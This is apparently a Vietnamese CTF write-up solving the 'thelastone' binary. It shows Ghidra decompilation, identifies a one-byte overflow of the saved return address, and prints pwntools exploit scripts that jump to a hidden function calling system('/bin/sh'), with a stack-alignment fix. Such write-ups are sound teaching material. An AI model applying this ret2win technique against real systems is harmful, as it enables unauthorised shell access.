Giờ ta sẽ nhìn qua file binary được cung cấp và các chế độ bảo vệ

![image](https://user-images.githubusercontent.com/114044703/213367728-dafb94f9-c705-49e2-891e-7b2a13b4f3e8.png)

![image](https://user-images.githubusercontent.com/114044703/213367995-43053f96-fc31-43a1-b767-c310ce9ba96c.png)

Ta sẽ kiểm tra hàm main bằng trình ghidra:

```
void main(EVP_PKEY_CTX *param_1)

{
  undefined8 local_38;
  undefined8 local_30;
  undefined8 local_28;
  undefined8 local_20;
  undefined4 local_18;
  uint local_14;
  int local_10;
  int local_c;
  
  local_38 = 0;
  local_30 = 0;
  local_28 = 0;
  local_20 = 0;
  local_c = 10;
  init(param_1);
  local_10 = open("/dev/urandom",0);
  if (-1 < local_10) {
    read(local_10,&local_14,4);
    close(local_10);
    srand(local_14);
    do {
      menu();
      __isoc99_scanf(&DAT_0040227c,&local_18);
      getchar();
      switch(local_18) {
      default:
        puts("Unknown option!");
        break;
      case 1:
        set_name(&local_38);
        break;
      case 2:
        get_name(&local_38);
        break;
      case 3:
        find_food();
        break;
      case 4:
        kill_zombie(local_c);
        local_c = local_c + -1;
        break;
      case 5:
        find_survivor();
        break;
      case 6:
                    /* WARNING: Subroutine does not return */
        exit(0);
      }
    } while( true );
  }
  puts("Cannot open urandom");
                    /* WARNING: Subroutine does not return */
  exit(0);
}
```
Khi đi sâu vào các hàm con:

set_name chỉ đơn thuần lấy tên từ bàn phím:

![image](https://user-images.githubusercontent.com/114044703/213368593-7e9fec1c-76ec-4e23-8cf8-410adf341daf.png)

get_name thì in ra tên nếu ta đã chọn tên:

![image](https://user-images.githubusercontent.com/114044703/213368616-9ac27f78-7a25-4efe-b324-43caf92b2096.png)
  
 In ra chuỗi

![image](https://user-images.githubusercontent.com/114044703/213368700-f8b9551f-3cff-4542-b24d-2a3fb8b8914e.png)

In ra số zombies(giảm dần)

![image](https://user-images.githubusercontent.com/114044703/213368714-a30f6097-d69c-43ad-b778-8d862b7e1d25.png)

Ở hàm find_survivor thì  nếu số random khác 0 thì ho ta nhập 0x58 từ bàn phím 

![image](https://user-images.githubusercontent.com/114044703/213369340-4bdfe4cd-f732-4835-8351-662220f94a39.png)

Thoạt nhìn thì đây là lỗi buffer over flow khi ```local_58``` chỉ có 76 phần tử nhưng để đè save rip lại không thể đè được khi offset của nó đồng thời là 0x58

![image](https://user-images.githubusercontent.com/114044703/213369599-6b950009-990a-45b0-b60b-f68f05e6eb06.png)

Tuy nhiên khi đi sâu vào hàm read_str thì có vẻ như là hàm đã đọc 0x58 + 1 byte -> ta có thể điều khiển được 1 byte của save rip -> Có khả năng cao đây là bài dạng ret2win

![image](https://user-images.githubusercontent.com/114044703/213372842-af6bc97c-9438-48d7-9d98-10124cb42ba7.png)


Ta thấy có hàm unknown có lệnh system("/bin/sh ") ta đang cần và có để dẫn tới được:

![image](https://user-images.githubusercontent.com/114044703/213370103-49eeeb96-e11c-4e6b-a462-efd679107fa5.png)

Tiến hành vào debug, ta đặt break point tại ret của find_survivor xem có thể dẫn sang địa chỉ unknow không:




Vậy ta có thể dẫn sang unknown là ```0x401667```

Viết khai thác với những dữ kiện trên:
```
from pwn import *
debug=1

if debug:
 	t=process("./thelastone")
 	gdb.attach(t,api=True)
else:
	t=remote("146.190.115.228",9995)
	#context.log_level = 'debug'
for i in range (5):             #lặp lại đến khi tìm được người sống sót
	t.sendlineafter(b">",b"5")
	data=t.recvline()
	if b"Nice, you found another survivor. Let's make friend with her now!\n" in data:
		break
	
t.sendafter(b">",b"A"*88+b"\x67")
t.interactive()

```

Khi thực thi có vẻ như đã có lỗi thanh ghi xmm0 khi địa chỉ rsp không đủ đk:

![image](https://user-images.githubusercontent.com/114044703/213371066-1019beb6-4b9c-453c-879d-13d026aaa257.png)

Thay thì nhảy ngay tại hàm unknown ta sẽ nhảy tới unknown +5(nhảy qua đoạn ```push rbp```) để địa chỉ rsp hợp lệ 

```
from pwn import *
debug=1

if debug:
 	t=process("./thelastone")
 	gdb.attach(t,api=True)
else:
	t=remote("146.190.115.228",9995)
	#context.log_level = 'debug'
for i in range (5):             #lặp lại đến khi tìm được người sống sót
	t.sendlineafter(b">",b"5")
	data=t.recvline()
	if b"Nice, you found another survivor. Let's make friend with her now!\n" in data:
		break
	
t.sendafter(b">",b"A"*88+b"\x6c")   #unknow+5
t.interactive()

```

Sau khi thực thi :

![image](https://user-images.githubusercontent.com/114044703/213371524-7d7bc2f8-ea3e-43eb-af97-9c86c540c1a5.png)




